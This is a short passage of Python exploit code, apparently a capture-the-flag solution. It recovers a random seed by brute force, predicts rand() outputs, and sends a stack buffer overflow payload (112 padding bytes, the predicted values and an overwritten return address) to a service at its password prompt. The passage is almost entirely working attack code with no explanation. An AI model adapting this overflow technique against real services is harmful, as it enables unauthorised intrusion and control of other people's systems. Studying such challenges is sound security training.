...
libc = bruteforce(md5msg)

a = libc.rand()
b = libc.rand()

s = b"A" * 112 + struct.pack("<I", b) + struct.pack("<I", a) + struct.pack("<I", 0) + struct.pack("<I", 0) + struct.pack("<I", 0x0040125c) + struct.pack("<I", 0) + b"\n"
ret = read_until(sock, b"Enter the password")
sock.sendall(s)
